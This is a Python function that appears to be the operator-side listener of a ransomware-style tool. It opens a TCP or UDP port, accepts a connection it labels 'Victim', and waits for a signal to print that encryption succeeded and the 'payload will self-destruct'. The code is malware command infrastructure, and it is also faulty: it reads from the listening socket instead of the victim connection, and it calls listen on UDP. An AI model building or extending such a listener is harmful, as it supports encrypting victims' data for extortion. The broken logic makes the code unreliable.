def connect(Connection_Type: str, port: int):
    import socket
    import os
    from os import path
    import sys
    if os.name == 'nt':
        from colorama import init
        init(convert=True)
    sys.path.insert(0, path.dirname(path.dirname(path.dirname(__file__))))
    from core.helper_core import Color
    black, red, green, yellow, blue, magenta, cyan, grey, reset = Color().GetAllColors()
    if Connection_Type == "TCP":
        Connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    elif Connection_Type == "UDP":
        Connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print("[" + blue + 'REPORT' + reset + "]  Making Connection")
    try:
        Connection.bind(('', int(port)))
        Connection.listen()
        Victim, Address = Connection.accept()

        Connected = True
        while Connected:
            if Connection.recv(1024).decode("UTF-8") == "->|" :
                print("Encryption was succesful . payload will self-destruct")

    except:
        Connected = False
        print("[" + red + '-' + reset +
              "] Connection Failed.Victim Might Be Offline Try Again Later")